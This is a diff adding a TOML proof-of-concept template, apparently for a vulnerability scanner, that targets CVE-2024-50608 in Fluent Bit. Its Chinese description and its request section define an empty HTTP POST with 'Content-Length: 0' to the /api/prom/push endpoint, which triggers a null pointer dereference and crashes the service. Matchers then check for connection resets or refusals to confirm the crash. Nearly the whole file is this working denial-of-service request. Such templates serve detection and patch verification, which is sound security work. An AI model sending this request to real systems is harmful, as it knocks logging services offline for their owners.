@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "通过向 Fluent Bit Prometheus Remote Write 输入插件发送 Content-Length: 0 的 HTTP POST 请求，触发空指针解引用导致服务崩溃。检测方式：发送恶意请求后验证服务是否断开连接。"
+id = "POC-AVE-2024-0543"
+name = "CVE-2024-50608 PoC"
+severity = "high"
+tags = [
+    "cve-2024-50608",
+    "fluent-bit",
+    "denial-of-service",
+    "null-pointer-dereference",
+]
+vuln_id = [
+    "CVE-2024-50608",
+    "AVE-2024-0543",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/prom/push"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Length = "0"
+Host = "{{Hostname}}:{{Port}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection reset",
+    "connection refused",
+    "EOF",
+    "no route to host",
+]
